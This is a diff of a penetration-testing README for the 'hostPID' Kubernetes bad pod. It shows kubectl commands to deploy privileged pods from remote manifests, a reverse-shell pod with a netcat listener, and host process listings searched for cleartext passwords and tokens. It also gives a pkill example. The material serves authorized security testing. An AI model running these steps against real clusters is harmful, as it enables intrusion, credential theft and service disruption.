@@ -5,40 +5,85 @@ There’s no clear path to get root on the node with only `hostPID`, but there a
 *	**Look for passwords, tokens, keys, etc.** – If you are lucky, you will find credentials and you’ll be able to use them to escalate privileges within the cluster, to services supported by the cluster, or to services that cluster-hosted applications are communicating with. It is a long shot, but you might find a Kubernetes service account token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster admin. 
 *	**Kill processes** – You can also kill any process on the node (presenting a denial-of-service risk), but I would advise against it on a penetration test!
 
+## Table of Contents
+- [Bad Pod #5: hostPID](#bad-pod-5-hostpid)
+  - [Table of Contents](#table-of-contents)
+- [Pod creation & access](#pod-creation--access)
+  - [Exec pods](#exec-pods)
+  - [Reverse shell pods](#reverse-shell-pods)
+  - [Deleting resources](#deleting-resources)
+- [Post exploitation](#post-exploitation)
+  - [View all processes running on the host and look for passwords, tokens, keys, etc.](#view-all-processes-running-on-the-host-and-look-for-passwords-tokens-keys-etc)
+  - [Also, you can also kill any process, but don't do that in production :)](#also-you-can-also-kill-any-process-but-dont-do-that-in-production-)
+  - [Attacks that apply to all pods, even without any special permissions](#attacks-that-apply-to-all-pods-even-without-any-special-permissions)
+- [Demonstrate impact](#demonstrate-impact)
+- [References and further reading:](#references-and-further-reading)
 
-# Pod Creation
-## Create a pod you can exec into
-Create pod
+# Pod creation & access
+
+## Exec pods
+Create one or more of these resource types and exec into the pod
+
+**Pod**  
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml 
-```
-Exec into pod 
-```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
 kubectl exec -it hostpid-exec-pod -- bash
 ```
+**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**
 
-## Reverse shell pod
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
-Set up listener
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/[RESOURCE_TYPE]/hostpid-exec-[RESOURCE_TYPE].yaml 
+kubectl get pods | grep hostpid-exec-[RESOURCE_TYPE]      
+kubectl exec -it hostpid-exec-[RESOURCE_TYPE]-[ID] -- bash
+```
+
+*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 
+
+To troubleshoot a case where you don't see pods, use `kubectl describe`
+
+```
+kubectl describe hostpid-exec-[RESOURCE_TYPE]
+```
+
+## Reverse shell pods
+Create one or more of these resources and catch the reverse shell
+
+**Step 1: Set up listener**
 ```bash
 nc -nvlp 3116
 ```
 
-Create pod from local manifest without modifying it by using env variables and envsubst
+**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
+
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace the HOST and PORT values to point the reverse shell to your listener
+* 
 ```bash
-HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/hostpid/pod/hostpid-revshell-pod.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostpid/[RESOURCE_TYPE]/hostpid-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
 ```
 
-Catch the shell
+**Step 3: Catch the shell**
 ```bash
 $ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
 
+## Deleting resources
+You can delete a resource using it's manifest, or by name. Here are some examples: 
+```
+kubectl delete [type] [resource-name]
+kubectl delete -f manifests/hostpid/pod/hostpid-exec-pod.yaml
+kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
+kubectl delete pod hostpid-exec-pod
+kubectl delete cronjob hostpid-exec-cronjob
+```
+
 # Post exploitation
 
-#### View all processes running on the host and look for passwords, tokens, keys, etc. 
+## View all processes running on the host and look for passwords, tokens, keys, etc. 
 ```bash
 ps -aux
 ...omitted for brevity...
@@ -47,9 +92,12 @@ root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c 
 ```
 Check out that clear text password in the ps output below! 
 
-#### Also, you can also kill any process, but don't do that in production :)
+## Also, you can also kill any process, but don't do that in production :)
+```
+pkill -f "nginx" 
+```
 
-#### Attacks that apply to all pods, even without any special permissions
+## Attacks that apply to all pods, even without any special permissions
 * Cloud metadata service
 * `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
 * Kubernetes exploits
@@ -59,3 +107,4 @@ Check out that clear text password in the ps output below!
 
 If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.
 
+# References and further reading: 
